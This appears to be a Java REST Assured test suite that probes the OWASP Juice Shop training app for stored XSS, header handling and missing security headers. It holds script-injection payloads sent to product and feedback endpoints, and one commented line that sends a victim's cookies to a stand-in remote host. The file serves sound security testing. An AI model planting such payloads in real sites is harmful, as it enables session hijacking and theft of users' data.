import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.response.Response;
import org.hamcrest.Matchers;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import static io.restassured.RestAssured.get;
import static io.restassured.RestAssured.given;
import static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;
import static org.hamcrest.Matchers.equalTo;

//import org.junit.jupiter.api.DisplayName;
//import org.junit.jupiter.api.Test;

//@DisplayName("Testing OWASP JuiceShop v.2.18.0")
public class JuiceShop {

    private String email;
    private String password;
    private String loginPath = "/user/login";

    @Before
    //NOTE: Load Properties (set URL, Port, Proxy, Admin-Login)
    public void initTarget() throws IOException {

        Properties properties = new Properties();

        try(InputStream stream = getClass().getClassLoader().getResourceAsStream("config.properties")){
            //InputStreamReader isr = new InputStreamReader(stream, "UTF-8");
            //properties.load(isr);
            properties.load(stream);
        }

        // Load config
        RestAssured.baseURI = properties.getProperty("base-uri");
        RestAssured.port = Integer.parseInt(properties.getProperty("port"));
        RestAssured.basePath = properties.getProperty("base-path");

        if (!properties.getProperty("proxy_ip").equals("")) {
            RestAssured.proxy(properties.getProperty("proxy_ip"), Integer.parseInt(properties.getProperty("proxy_port")));
        }

        this.email = properties.getProperty("username");
        this.password = properties.getProperty("password");
    }

    @Test
    //@DisplayName("Is specified juice-shop online?")
    //TODO: write better GET test to see if target is reachable. if not, then break and end all other tests
    public void pre_targetOnline() {
        RestAssured.given().
                when().
                get("/product/search").
                then().
                statusCode(200);
    }

    @Test
    //@DisplayName("performing simple search with expected result")
    public void pre__simpleSearchMatchesExpectedResult() {
        RestAssured.given().
                param("q","orange").
                when().
                get("/product/search").
                then().
                statusCode(200).
                body("data[0].name", Matchers.equalTo("Orange Juice (1000ml)")).
                body("data[0].price", equalTo(2.99f));
    }

    @Test
    //@DisplayName("matching response to defined JSON schema")
    public void pre_responseMatchesJSONProductSchema() {
        RestAssured.given().
                param("q","orange").
                when().
                get("/product/search").
                then().
                assertThat().
                body(matchesJsonSchemaInClasspath("juiceshop-product-schema.json"));
    }

    @Test
    //@DisplayName("authenticating: basic, JSON, HTTP body")
    public void authBasicJSONHTTPBody() {
        RestAssured.given().
                request().body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                contentType(ContentType.JSON).
                when().
                post("/user/login").
                then().
                statusCode(200);
    }

    @Test
    //NOTE: Checks only if payload can be stored, not if it's executed.
    public void xSS_Stored_Payload_Accepted_Tier3() {

        String payloadXXS3 = "{" +
                "\"id\": 1," +
                "\"name\":" +
                "\"Apple Juice (1000ml)\"," +
                "\"description\": \"Some text<script>alert(\\\"XSS3\\\")</script>\"," +
                "\"price\": 1.99," +
                "\"image\": \"apple_juice.jpg\"," +
                "\"createdAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
                "\"updatedAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
                "\"deletedAt\": null" +
                "}";

        // Clearing basePath = /rest
        RestAssured.basePath = "";

        given().
                request().
                    body(payloadXXS3).
                    contentType(ContentType.JSON).
                when().
                    put("/api/Products/1").
                then().
                    statusCode(200);
                // XXS Payload was accepted by the server.
    }

    @Test
    //NOTE: Checks only if payload can be stored, not if it's executed.
    public void xSS_Stored_Nested_Payload_Accepted_Tier4() {

        String payloadXXS4 = "{\"comment\":\"<<script>alert(\\\"XSS4\\\")</script>script>alert(\\\"XSS4\\\")<</script>/script>\",\"rating\":0}";

        // Clearing basePath = /rest
        RestAssured.basePath = "";

        given().
                request().
                body(payloadXXS4).
                contentType(ContentType.JSON).
                when().
                post("/api/Feedbacks/").
                then().
                statusCode(200);
        // XXS Payload was accepted by the server.

        // <<script>alert("XSS4")</script>script>alert("XSS4")<</script>/script>
    }

    @Test
    //NOTE: Opens a server socket and waits for XSS3 Payload to connect (execution validation)
    public void xSS_Stored_Payload_Executed_Tier3() {



        //Payload (Sending cookies to remote server)
        /*
        if (document.cookie !== null) {
            new Image().src = 'http://remote.com/log.php?localStorage='+escape(document.cookie);
        }
        */

    }

    @Test
    //NOTE: Opens a server socket and waits for XSS4 Payload to connect (execution validation)
    public void xSS_Stored_Nested_Payload_Executed_Tier4() {

    }

    @Test
    //NOTE: No Content-Type header at all. 401/406 expected.
    //TODO: rest-assured always adds a content-type header (text/plain)
    public void noContenttypeHeader(){
        given().
                request().
                body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                when().
                post(loginPath).
                then().
                statusCode(401);
    }

    @Test
    //NOTE: Gives a Content-Type Header, but sends other data.
    public void falseContenttypeHeader(){
        given().
                request().
                body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                contentType(ContentType.HTML).
                when().
                post(loginPath).
                then().
                statusCode(401);
    }

    @Test
    //NOTE: Does the server copy the clients Accept-Header in the response Content-Type? 401/406 expected.
    public void sendingFakeAcceptHeader() {

        Response response = given().
                request().
                header("Accept","myHeader").
                body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                contentType(ContentType.JSON).
                when().
                post(loginPath);

        if (response.getHeader("Content-Type").equals("myHeader")) {
            Assert.fail("Fake Request Accept-Header was returned in Response Content-Type (without server-side validation).");
        }
    }

    @Test
    //NOTE: Checks for common security header X-Content-Type-Options: nosniff
    public void securityHeader_XContentTypeOptions() {
        Response response = given().
                request().
                body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                contentType(ContentType.JSON).
                when().
                post(loginPath);

        if (!response.getHeader("X-Content-Type-Options").equals("nosniff")) {
            Assert.fail("Security-Header \"X-Content-Type-Options: nosniff\" not found.");
        }
    }

    @Test
    //NOTE: Checks for common security header X-Frame-Options: SAMEORIGIN
    public void securityHeader_XFrameOptions() {
        Response response = given().
                request().
                body("{\"email\":\""+email+"\",\"password\":\""+password+"\"}").
                contentType(ContentType.JSON).
                when().
                post(loginPath);

        if (!response.getHeader("X-Frame-Options").equals("SAMEORIGIN")) {
            Assert.fail("Security-Header \"X-Frame-Options: SAMEORIGIN\" not found.");
        }
    }

    @Test
    //NOTE: SQLi
    public void sQLi() {
        //GET /rest/product/search?q=undefined
        //injecting in q; payload in "undefined";
    }


}
